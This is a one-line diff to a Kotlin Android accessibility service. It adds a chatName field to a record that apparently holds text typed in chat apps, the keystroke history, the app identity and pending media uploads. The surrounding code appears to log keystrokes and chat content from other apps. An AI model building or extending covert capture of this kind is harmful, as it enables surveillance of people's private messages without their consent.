@@ -207,6 +207,7 @@ class EnhancedAccessibilityService : AccessibilityService() {
                         appPackage = buffer.packageName,
                         appName = buffer.appName,
                         chatIdentifier = buffer.chatIdentifier,
+                        chatName = buffer.chatIdentifier,
                         text = buffer.currentText,
                         keyHistory = buffer.keyHistory.ifEmpty { null },
                         mediaUrls = null, // Will be updated after media upload
